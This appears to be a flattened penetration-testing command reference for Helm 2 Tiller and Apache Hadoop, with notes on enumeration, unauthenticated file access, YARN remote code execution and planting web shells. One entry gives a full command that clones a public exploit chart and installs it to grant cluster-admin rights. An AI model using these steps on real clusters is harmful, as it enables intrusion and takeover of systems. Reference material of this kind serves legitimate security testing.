tiller-helm.description: Tiller is the server-side component of Helm 2 that runs in Kubernetes clusters with high privileges; unauthenticated access to port 44134 allows installing charts that grant the default service account cluster-admin rights.

commands.name: Find Tiller pods via kubectl
commands.note: Searches for Tiller pods in kube-system namespace. Also check other namespaces.

commands.name: Find Tiller service via kubectl
commands.note: Finds the Tiller ClusterIP service and its port (usually 44134/TCP).

commands.name: Find Tiller in all namespaces
commands.note: Searches across all namespaces for Tiller deployments.

commands.name: Nmap scan for Tiller port
commands.note: Confirms Tiller is listening on port 44134.

commands.name: Helm version check
commands.note: Queries Tiller version over gRPC. Confirms access and reveals Helm/Tiller version.

commands.name: Helm privilege escalation via pwnchart
commands.command: git clone https://github.com/Ruil1n/helm-tiller-pwn && helm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn/pwnchart
commands.note: Installs a Helm chart that grants the default service account cluster-admin ClusterRoleBinding across the whole Kubernetes cluster. Achieves full cluster compromise.

hadoop.name: Hadoop
hadoop.description: Apache Hadoop runs without authentication by default; the NameNode WebHDFS API (50070) and YARN ResourceManager (8088) allow unauthenticated file access and remote code execution respectively, making exposed clusters high-value targets.

commands.name: Nmap Hadoop JobTracker info
commands.note: Retrieves MapReduce JobTracker information from port 50030.

commands.name: Nmap Hadoop TaskTracker info
commands.note: Retrieves TaskTracker information from port 50060.

commands.name: Nmap Hadoop NameNode info
commands.note: Retrieves NameNode (HDFS master) information from port 50070.

commands.name: Nmap Hadoop DataNode info
commands.note: Retrieves DataNode information from port 50075.

commands.name: Nmap Hadoop Secondary NameNode info
commands.note: Retrieves Secondary NameNode information from port 50090.

commands.name: WebHDFS list root directory
commands.note: Lists the HDFS root directory impersonating the hdfs superuser. Works when security=off (default).

commands.name: WebHDFS read arbitrary file
commands.note: Reads an arbitrary file from HDFS by impersonating the hdfs user. -L follows the redirect to the DataNode.

commands.name: WebHDFS upload file/payload
commands.note: Uploads a file to HDFS impersonating hdfs user. Can be used to plant web shells or payloads.

commands.name: YARN get new application ID
commands.note: Obtains a new application ID from YARN ResourceManager. Required before job submission. No auth in default simple mode.

commands.name: YARN RCE via job submission
commands.note: Submits a YARN job that executes an arbitrary command. Achieves RCE with the YARN container user. Widely exploited for cryptominer deployment.

commands.name: Check container-executor for CVE-2023-26031
commands.note: Checks if container-executor has a relative RUNPATH and SUID bit set (CVE-2023-26031, Hadoop 3.3.1-3.3.4). Vulnerable if RUNPATH contains $ORIGIN/ and binary is SUID root.
